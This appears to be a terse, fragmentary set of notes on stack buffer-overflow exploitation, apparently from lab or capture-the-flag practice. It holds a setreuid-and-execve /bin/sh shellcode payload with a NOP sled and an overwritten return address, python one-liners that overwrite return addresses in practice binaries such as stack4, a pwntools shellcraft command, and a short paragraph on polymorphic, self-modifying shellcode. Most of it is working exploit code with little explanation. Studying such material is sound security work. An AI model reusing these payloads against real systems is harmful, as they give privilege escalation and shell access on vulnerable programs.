Here is simple fuzzer 


from string import ascii_letters

for i in ascii_letters[26:]:

print (i * 4 , end="")


###########################


$(python -c "print '\x90'*89 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*20 + '\x78\xe3\xff\xff\xff\x7f'")


###########################



./buffer-overflow $(python exploit.py; cat)



python -c 'print("A"*64 + "\x9d\x06\x40")'

python -c 'print("A"*64)'

python -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./stack4

*pwn shellcraft -f d amd64.linux.setreuid 1002*

./buffer-overflow $(python [exploit.py](http://exploit.py/); cat)

localhost~$**as test_shellcode.s -o test_shellcode.o**



Polymorphic code refers to a piece of code's ability to change itself. Machine code can modify itself through any of the functions which allow modification of registers and the stack. Self-modifying code is generally used to prevent the reverse-engineer from understanding the code. This method of code obfuscation is quite common and is considered a standard in most targeted exploitations.}}Due to the nature of the stack and the x86 architecture, the stack grows backwards, but executes forwards.